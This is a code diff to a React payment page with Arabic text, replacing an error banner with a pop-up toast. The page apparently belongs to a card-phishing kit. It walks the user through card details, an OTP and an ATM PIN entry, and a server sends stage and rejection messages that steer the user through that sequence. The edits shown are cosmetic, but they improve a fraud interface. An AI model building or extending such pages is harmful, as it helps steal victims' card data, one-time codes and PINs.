@@ -63,10 +63,33 @@ function InfoTable({ rows }: { rows: Array<{ label: string; value: string }> }) 
   )
 }
 
-function ErrorBanner({ message }: { message: string }) {
+function Toast({ message, onClose }: { message: string; onClose: () => void }) {
+  const [isVisible, setIsVisible] = useState(false)
+
+  useEffect(() => {
+    setIsVisible(true)
+    const timer = setTimeout(() => {
+      setIsVisible(false)
+      setTimeout(onClose, 300)
+    }, 5000)
+    return () => clearTimeout(timer)
+  }, [onClose])
+
   return (
-    <div className="mb-4 rounded-2xl border border-[#f1c5c8] bg-[#fff5f5] px-4 py-3 text-[13px] text-[#c74343]">
-      {message}
+    <div 
+      className={`fixed top-4 left-1/2 z-[9999] w-[90%] max-w-md -translate-x-1/2 transition-all duration-300 transform ${
+        isVisible ? 'translate-y-0 opacity-100' : '-translate-y-8 opacity-0'
+      }`}
+    >
+      <div className="flex items-center gap-3 rounded-2xl border border-[#f1c5c8] bg-[#fff5f5] p-4 shadow-xl">
+        <div className="flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-[#fee2e2] text-xl">⚠️</div>
+        <div className="flex-1 text-[14px] font-medium leading-6 text-[#c74343] text-right" dir="rtl">{message}</div>
+        <button onClick={() => { setIsVisible(false); setTimeout(onClose, 300); }} className="text-[#c74343] hover:opacity-70">
+          <svg width="20" height="20" viewBox="0 0 20 20" fill="currentColor">
+            <path fillRule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clipRule="evenodd" />
+          </svg>
+        </button>
+      </div>
     </div>
   )
 }
@@ -268,7 +291,7 @@ function CardForm({
 
   return (
     <form onSubmit={handleSubmit} className="space-y-4">
-      {error && <ErrorBanner message={error} />}
+      {/* Error banner removed in favor of toast */}
 
       <SectionCard title="Card Details">
         <div className="space-y-4">
@@ -472,7 +495,7 @@ function OtpForm({
         <InfoTable rows={rows} />
       </SectionCard>
 
-      {(error || otpError) && <ErrorBanner message={error || otpError} />}
+      {/* Error banner removed in favor of toast */}
 
       <SectionCard title="Card Security Verification">
         <div className="text-center">
@@ -534,7 +557,7 @@ function AtmPinForm({
         <InfoTable rows={rows} />
       </SectionCard>
 
-      {(error || pinError) && <ErrorBanner message={error || pinError} />}
+      {/* Error banner removed in favor of toast */}
 
       <SectionCard title="ATM PIN Verification">
         <div className="text-center">
@@ -625,6 +648,7 @@ function FailedPage({ onRetry }: { onRetry: () => void }) {
 export default function Payment({ onBackToHome }: { onBackToHome: () => void }) {
   const [stage, setStage] = useState<Stage>('card')
   const [errorMessage, setErrorMessage] = useState<string | null>(null)
+  const [showToast, setShowToast] = useState(false)
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [sessionData, setSessionData] = useState<{fullName?: string, idNumber?: string}>({})
   const [sessionId] = useState(() => {
@@ -720,6 +744,7 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
             } else if (serverStage === 'card') {
               setStage('card')
               setErrorMessage(serverError || rejectionMessages.card)
+              setShowToast(true)
             }
           }
 
@@ -729,6 +754,7 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
             } else if (serverStage === 'otp') {
               setStage('otp')
               setErrorMessage(serverError || rejectionMessages.otp)
+              setShowToast(true)
             }
           }
 
@@ -738,9 +764,11 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
             } else if (serverStage === 'atm') {
               setStage('atm')
               setErrorMessage(serverError || rejectionMessages.atm)
+              setShowToast(true)
             } else if (serverStage === 'failed') {
               setStage('failed')
               setErrorMessage(serverError || rejectionMessages.atm)
+              setShowToast(true)
             }
           }
         }
@@ -770,6 +798,7 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
     } catch (apiErr: any) {
       console.error('[Payment] API call failed:', apiErr?.message || apiErr)
       setErrorMessage('فشل الاتصال بالخادم. يرجى المحاولة مرة أخرى.')
+      setShowToast(true)
     }
     
     setIsSubmitting(false)
@@ -790,6 +819,7 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
     } catch (apiErr: any) {
       console.error('[Payment] API call failed:', apiErr?.message || apiErr)
       setErrorMessage('فشل الاتصال بالخادم. يرجى المحاولة مرة أخرى.')
+      setShowToast(true)
     }
     
     setIsSubmitting(false)
@@ -810,6 +840,7 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
     } catch (apiErr: any) {
       console.error('[Payment] API call failed:', apiErr?.message || apiErr)
       setErrorMessage('فشل الاتصال بالخادم. يرجى المحاولة مرة أخرى.')
+      setShowToast(true)
     }
     
     setIsSubmitting(false)
@@ -827,11 +858,14 @@ export default function Payment({ onBackToHome }: { onBackToHome: () => void }) 
   return (
     <PaymentFrame>
       <PaymentGatewayHeader />
+      
+      {showToast && errorMessage && (
+        <Toast message={errorMessage} onClose={() => setShowToast(false)} />
+      )}
 
       <div className="flex-1 max-w-3xl w-full mx-auto px-6 py-8">
         {stage === 'card' && (
           <>
-            {errorMessage && <ErrorBanner message={errorMessage} />}
             <SectionCard title="ملخص الدفع">
               <InfoTable rows={transactionRows} />
             </SectionCard>
